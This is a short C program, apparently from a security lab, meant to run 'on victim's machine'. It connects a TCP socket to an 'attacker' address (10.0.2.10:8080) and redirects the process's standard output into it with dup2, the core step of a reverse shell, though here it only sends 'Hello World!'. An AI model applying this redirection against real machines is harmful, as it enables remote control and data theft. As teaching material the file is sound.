/* redirect_to_tcp.c */
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

// Run this program on victim's machine
void main()
{
   struct sockaddr_in server;

   // Create a TCP socket
   int sockfd= socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

   // Fill in the destination information (IP, port #, and family)
   memset (&server, '\0', sizeof(struct sockaddr_in));
   server.sin_family = AF_INET;
   
   // TO DO: Find the IP address of the attacker's machine and
   // replace the IP address in line 24 with that address.
   // Redirect output to TCP server running on attacker's machine
   // Here, we assuming the attacker's IP is 10.0.2.10
   server.sin_addr.s_addr = inet_addr("10.0.2.10");
   server.sin_port   = htons(8080);

   // Connect to the destination
   connect(sockfd, (struct sockaddr*) &server,sizeof(struct sockaddr_in));           

   // Send data via the TCP connection
   char *data = "Hello World!";
   // write(sockfd, data, strlen(data));         
   dup2(sockfd, 1);                             
   printf("%s\n", data);                       
}
